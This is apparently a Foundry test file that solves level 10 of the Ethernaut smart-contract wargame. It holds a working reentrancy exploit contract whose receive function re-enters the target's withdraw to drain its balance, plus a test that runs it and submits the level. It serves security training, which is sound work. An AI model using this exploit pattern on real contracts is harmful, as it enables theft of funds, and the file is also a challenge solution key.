// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./EthernautTest.t.sol";

interface Level10 {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract Reenter {
    function reenter(Level10 _level10) external payable {
        // Donate, this will re-enter to receive function
        _level10.donate{value: msg.value}(address(this));
        // On completion, we can withdraw the remaining funds
        _level10.withdraw(msg.value);
        // Return all ether to the player
        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {
        // Stop reentrancy if there is no ether left
        if (msg.sender.balance != 0) {
            // Re-enter to facilitate a double withdrawal
            Level10(msg.sender).withdraw(msg.value);
        }
    }
}

contract Level10Test is EthernautTest {
    function testLevel10() public {
        // 0.001 ether needed to create level 10
        _createLevel("10", 0.001 ether);

        // Create reenter contract
        Reenter reenter = new Reenter();
        // Call reenter using the amount of ether in the level instance
        // This will donate the same amount already in the level instance
        // We can then reenter and do a double withdrawal, emptying the instance
        reenter.reenter{value: levelInstance["10"].balance}(Level10(levelInstance["10"]));

        require(_submitLevel("10"));
    }

    receive() external payable {}
}
